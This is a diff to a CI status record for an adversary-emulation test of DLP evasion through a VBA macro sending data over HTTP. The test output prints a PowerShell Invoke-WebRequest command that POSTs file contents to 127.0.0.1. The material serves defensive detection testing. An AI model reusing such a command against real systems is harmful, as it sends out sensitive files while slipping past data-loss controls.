@@ -2,12 +2,11 @@
   "guid": "e2d85e66-cb66-4ed7-93b1-833fc56c9319",
   "platforms": {
     "windows": {
-      "consecutive_failures": 1,
-      "last_status": "failed",
-      "stdout": "",
+      "consecutive_failures": 0,
+      "last_status": "passed",
+      "stdout": "PathToAtomicsFolder = D:\\a\\atomic-red-team\\atomic-red-team\\atomics\r\n\r\nCheckPrereq's for: \r\nT1027-6 DLP Evasion via Sensitive Data in VBA Macro over HTTP\r\n\r\nPrerequisites met: \r\nT1027-6 DLP Evasion via Sensitive Data in VBA Macro over HTTP\r\n\r\n\nPathToAtomicsFolder = D:\\a\\atomic-red-team\\atomic-red-team\\atomics\r\n\r\nExecuting test: \r\nT1027-6 DLP Evasion via Sensitive Data in VBA Macro over HTTP\r\n\r\nInvoke-WebRequest : Object reference not set to an instance of an object.\r\nAt line:1 char:4\r\n+ & {Invoke-WebRequest -Uri 127.0.0.1 -Method POST -Body \"D:\\a\\atomic-r ...\r\n    + CategoryInfo          : NotSpecified: (:) [Invoke-WebRequest], NullReferenceException\r\n+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + FullyQualifiedErrorId : System.NullReferenceException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand\r\nExit code: 0\r\nDone executing test: \r\nT1027-6 DLP Evasion via Sensitive Data in VBA Macro over HTTP\r\n\r\n\nPathToAtomicsFolder = D:\\a\\atomic-red-team\\atomic-red-team\\atomics\r\n\r\nExecuting cleanup for test: \r\nT1027-6 DLP Evasion via Sensitive Data in VBA Macro over HTTP\r\n\r\nDone executing cleanup for test: \r\nT1027-6 DLP Evasion via Sensitive Data in VBA Macro over HTTP\r\n\r\n",
       "stderr": "",
-      "exit_code": 1,
-      "last_error": "The process cannot access the file 'C:\\Users\\runneradmin\\AppData\\Local\\Temp\\tmpaqau2j.tmp' because it is being used by another process."
+      "exit_code": 0
     }
   }
 }
